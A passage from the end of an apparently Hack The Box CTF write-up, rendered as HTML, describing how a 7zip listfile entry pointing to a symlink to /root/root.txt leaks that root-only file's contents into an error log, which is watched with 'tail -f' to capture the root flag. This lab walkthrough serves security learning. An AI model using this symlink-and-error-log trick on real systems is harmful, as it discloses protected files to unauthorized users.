+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">file1.pdf
+</span></span><span class="line"><span class="cl">secret.txt
+</span></span></code></pre></div><p>In the case where <code>myfile</code> is a symbolic link to another file, it is the content of that file that is read instead. In our our example, let&rsquo;s say we have <code>myfile</code> pointing to <code>/root/root.txt</code>. 7zip will consider the content of <code>/root/root.txt</code> as a file to archive, but since there are no files with that name, it will cause an error which will be logged in <code>error.log</code> file, disclosing the content of <code>/root/root.txt</code>.</p>
+<blockquote>
+<p>Note that providing directly the symbolic link (without using listfiles) would not work in this case since the command uses the <code>-snl</code> argument. This will archive the link itself instead of the content of the file that is being pointing at.</p>
+<figure><img src="/img/htb/ctf/snl_arg.png"
+    alt="-snl argument"><figcaption>
+      <p>-snl argument</p>
+    </figcaption>
+</figure>
+
+</blockquote>
+<p>Another problem is that the <code>error.log</code> file is cleaned up after each execution. But we can use the <code>tail</code> command to monitor it for any changes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tail -f error.log
+</span></span></code></pre></div><p>So in one terminal we&rsquo;ll create (as the user <code>apache</code>) two files:</p>
+<ul>
+<li><code>@myfile</code></li>
+<li><code>myfile</code> which is a link to the file we want to read, in this case <code>/root/root.txt</code></li>
+</ul>
+<figure><img src="/img/htb/ctf/symlink.png"
+    alt="Creating necessary files"><figcaption>
+      <p>Creating necessary files</p>
+    </figcaption>
+</figure>
+
+<p>And in the second terminal (as <code>ldapuser</code>), we monitor the changes on <code>error.log</code>.</p>
+<p>After a few seconds, we get the root flag in the second terminal:</p>
+<figure><img src="/img/htb/ctf/root.txt.png"
+    alt="Root flag obtained!"><figcaption>
+      <p>Root flag obtained!</p>
+    </figcaption>
+</figure>
+
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
